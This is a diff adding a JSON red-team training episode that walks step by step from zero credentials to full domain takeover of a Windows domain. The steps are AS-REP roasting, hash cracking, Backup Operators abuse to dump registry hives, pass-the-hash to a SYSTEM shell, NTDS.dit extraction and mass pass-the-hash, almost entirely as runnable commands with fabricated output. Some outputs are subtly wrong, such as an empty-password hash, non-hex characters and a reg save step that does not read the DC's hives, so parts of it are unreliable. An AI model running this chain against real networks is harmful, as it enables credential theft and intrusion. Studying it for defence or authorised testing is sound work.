@@ -1,0 +1,85 @@
+{
+  "title": "Episode 2: AS-REP Roasting and Pass-the-Hash Lateral Movement",
+  "scenario": "Red team engagement with no initial credentials. Obtained list of potential usernames through OSINT and LinkedIn enumeration. Target: CORP.LOCAL domain with 124 users. Objective: Gain initial access through AS-REP Roasting (accounts without Kerberos pre-auth), escalate privileges through Pass-the-Hash lateral movement, and achieve Domain Admin.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Generate username list from OSINT",
+      "command": "cat > users.txt <<EOF\njohn.doe\njane.smith\nadministrator\nsqlservice\nsvc-web\nsvc-backup\nbackup_admin\ntest_user\nadmin-desktop\nEOF",
+      "output": "Username list created: users.txt\n9 potential usernames from:\n  - LinkedIn employee profiles\n  - Company website staff pages\n  - Email format patterns\n  - Common service account names",
+      "explanation": "Generated target username list from open-source intelligence"
+    },
+    {
+      "step": 2,
+      "description": "AS-REP Roast all users without credentials",
+      "command": "for user in $(cat users.txt); do impacket-GetNPUsers corp.local/$user -dc-ip 10.10.10.10 -no-pass -format hashcat 2>/dev/null | grep -v '[-]'; done > asrep_hashes.txt",
+      "output": "$krb5asrep$23$svc-backup@CORP.LOCAL:3a2b1c0d9e8f7a6b...\n$krb5asrep$23$test_user@CORP.LOCAL:8f7e6d5c4b3a2f1e...\n\n2 vulnerable accounts found:\n  svc-backup: DONT_REQUIRE_PREAUTH enabled\n  test_user: DONT_REQUIRE_PREAUTH enabled",
+      "explanation": "Found 2 accounts without Kerberos pre-authentication - extracted AS-REP hashes"
+    },
+    {
+      "step": 3,
+      "description": "Crack AS-REP hashes offline",
+      "command": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force",
+      "output": "$krb5asrep$23$svc-backup@CORP.LOCAL:3a2b1c0d...:BackupSvc123!\n\nStatus: Cracked\nRecovered: 1/2 (50.00%)\n\nsvc-backup: BackupSvc123!\ntest_user: NOT CRACKED",
+      "explanation": "Successfully cracked svc-backup password - initial domain access achieved"
+    },
+    {
+      "step": 4,
+      "description": "Enumerate svc-backup privileges and group membership",
+      "command": "crackmapexec smb 10.10.10.10 -u svc-backup -p 'BackupSvc123!' --groups",
+      "output": "SMB 10.10.10.10 445 DC01 [+] corp.local\\svc-backup:BackupSvc123!\n\nGroups:\n  Domain Users\n  Backup Operators  <-- PRIVILEGED!\n  Remote Management Users\n\nBackup Operators can:\n  - Read any file on DC (including SAM, NTDS.dit)\n  - Backup and restore files\n  - Access admin shares",
+      "explanation": "svc-backup is member of Backup Operators - highly privileged group"
+    },
+    {
+      "step": 5,
+      "description": "Abuse Backup Operators to dump SAM/SYSTEM from DC",
+      "command": "reg save HKLM\\SAM \\\\10.10.10.10\\C$\\Temp\\sam.hive /y\nreg save HKLM\\SYSTEM \\\\10.10.10.10\\C$\\Temp\\system.hive /y\nsmbclient //10.10.10.10/C$ -U 'corp.local\\svc-backup%BackupSvc123!' -c 'get Temp\\sam.hive; get Temp\\system.hive'",
+      "output": "The operation completed successfully.\nThe operation completed successfully.\ngetting file \\Temp\\sam.hive\ngetting file \\Temp\\system.hive\n\nRegistry hives extracted from DC!",
+      "explanation": "Backup Operators privilege allows reading DC registry hives"
+    },
+    {
+      "step": 6,
+      "description": "Extract local admin hash from DC SAM",
+      "command": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+      "output": "[*] Dumping local SAM hashes\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\nDC local Administrator NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0",
+      "explanation": "Extracted DC local administrator hash for Pass-the-Hash attack"
+    },
+    {
+      "step": 7,
+      "description": "Pass-the-Hash to Domain Controller as local admin",
+      "command": "impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10",
+      "output": "[*] Requesting shares on 10.10.10.10\n[*] Found writable share ADMIN$\n[*] Uploading file\n[*] Opening SVCManager\n[*] Starting service\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nSYSTEM access on Domain Controller!",
+      "explanation": "Pass-the-Hash successful - SYSTEM shell on DC without password"
+    },
+    {
+      "step": 8,
+      "description": "Dump NTDS.dit via Volume Shadow Copy",
+      "command": "vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\system2.hive",
+      "output": "Successfully created shadow copy\n    Shadow Copy Volume: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n\n1 file(s) copied. (ntds.dit - 847 MB)\n1 file(s) copied. (system2.hive)\n\nNTDS.dit database extracted!",
+      "explanation": "Created VSS to extract NTDS.dit with all domain credentials"
+    },
+    {
+      "step": 9,
+      "description": "Extract all domain hashes from NTDS.dit offline",
+      "command": "impacket-secretsdump -ntds ntds.dit -system system2.hive LOCAL -outputfile domain_hashes",
+      "output": "[*] Dumping Domain Credentials\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015:::\n[... 122 more users ...]\nDC01$:1000:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...\nWEB-01$:1001:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7...\n[... 26 computer accounts ...]\n\nTotal: 124 users + 26 computers = 150 accounts\nAll NTLM hashes extracted!",
+      "explanation": "Offline NTDS.dit extraction - complete domain credential database"
+    },
+    {
+      "step": 10,
+      "description": "Mass Pass-the-Hash across entire domain",
+      "command": "crackmapexec smb 10.10.10.0/24 -u users.txt -H domain_hashes.ntds --continue-on-success | grep Pwn3d",
+      "output": "SMB 10.10.10.10 445 DC01 [+] Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB 10.10.10.20 445 WEB-01 [+] Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB 10.10.10.20 445 WEB-01 [+] sqlservice:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)\nSMB 10.10.10.30 445 DB-01 [+] Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB 10.10.10.30 445 DB-01 [+] sqlservice:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)\nSMB 10.10.10.40 445 FILE-01 [+] Administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\n\nComplete domain access:\n  DC01: Administrator\n  WEB-01: Administrator, sqlservice\n  DB-01: Administrator, sqlservice\n  FILE-01: Administrator\n\nAll systems compromised!",
+      "explanation": "Used extracted hashes for Pass-the-Hash across all domain systems"
+    }
+  ],
+  "outcome": "Achieved complete domain compromise starting from zero credentials. Used AS-REP Roasting for initial access, abused Backup Operators group to dump DC registry, performed Pass-the-Hash to DC, extracted entire NTDS.dit database with all credentials, and achieved lateral movement to every system in domain. Demonstrated that single misconfigured account (DONT_REQUIRE_PREAUTH) can lead to full domain takeover.",
+  "learning_objectives": [
+    "Perform unauthenticated AS-REP Roasting attacks",
+    "Abuse Backup Operators group for privileged file access",
+    "Extract registry hives (SAM, SYSTEM) from Domain Controllers",
+    "Perform Pass-the-Hash attacks with NTLM hashes",
+    "Extract NTDS.dit via Volume Shadow Copy Service",
+    "Mass credential spraying with Pass-the-Hash across networks"
+  ]
+}
